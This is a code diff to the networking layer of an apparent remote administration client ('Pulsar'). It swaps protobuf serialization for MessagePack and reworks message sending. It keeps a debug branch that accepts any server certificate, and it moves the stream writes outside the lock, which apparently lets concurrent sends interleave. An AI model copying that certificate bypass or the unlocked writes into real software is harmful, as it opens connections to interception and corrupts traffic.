@@ -17,7 +17,6 @@ using System.Collections.Concurrent;
 using Pulsar.Common.Messages.Administration.ReverseProxy;
 using System.Diagnostics;
 using System.IO;
-using ProtoBuf;
 
 namespace Pulsar.Client.Networking
 {
@@ -178,8 +177,6 @@ namespace Pulsar.Client.Networking
             _readBuffer = new byte[HEADER_SIZE];
             _readOffset = 0;
             _readLength = HEADER_SIZE;
-
-            TypeRegistry.AddTypesToSerializer(typeof(IMessage), TypeRegistry.GetPacketTypes(typeof(IMessage)).ToArray());
         }
 
         /// <summary>
@@ -231,8 +228,6 @@ namespace Pulsar.Client.Networking
             // for debugging don't validate server certificate
             return true;
 #else
-            var serverCsp = (RSACryptoServiceProvider)_serverCertificate.PublicKey.Key;
-            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(certificate).PublicKey.Key;
             // compare the received server certificate with the included server certificate to validate we are connected to the correct server
             return _serverCertificate.Equals(certificate);
 #endif
@@ -272,11 +267,8 @@ namespace Pulsar.Client.Networking
                         {
                             try
                             {
-                                using (var stream = new MemoryStream(_readBuffer))
-                                {
-                                    var message = Serializer.Deserialize<IMessage>(stream);
-                                    OnClientRead(message, _readBuffer.Length);
-                                }
+                                var message = PulsarMessagePackSerializer.Deserialize(_readBuffer);
+                                OnClientRead(message, _readBuffer.Length);
                             }
                             finally
                             {
@@ -367,28 +359,21 @@ namespace Pulsar.Client.Networking
         /// <param name="message">The message to send.</param>
         private void SafeSendMessage(IMessage message)
         {
-            if (_stream == null)
+            SslStream localStream;
+            lock (_sendMessageLock)
             {
-                return;
+                localStream = _stream;
             }
+
+            if (localStream == null)
+                return;
 
             try
             {
-                lock (_sendMessageLock)
-                {
-                    using (var ms = new MemoryStream())
-                    {
-                        if (_stream == null)
-                            return;
-
-                        Serializer.Serialize(ms, message);
-
-                        var payload = ms.ToArray();
-                        _stream.Write(BitConverter.GetBytes(payload.Length), 0, HEADER_SIZE);
-                        _stream.Write(payload, 0, payload.Length);
-                        _stream.Flush();
-                    }
-                }
+                var payload = PulsarMessagePackSerializer.Serialize(message);
+                localStream.Write(BitConverter.GetBytes(payload.Length), 0, HEADER_SIZE);
+                localStream.Write(payload, 0, payload.Length);
+                localStream.Flush();
             }
             catch (Exception ex)
             {
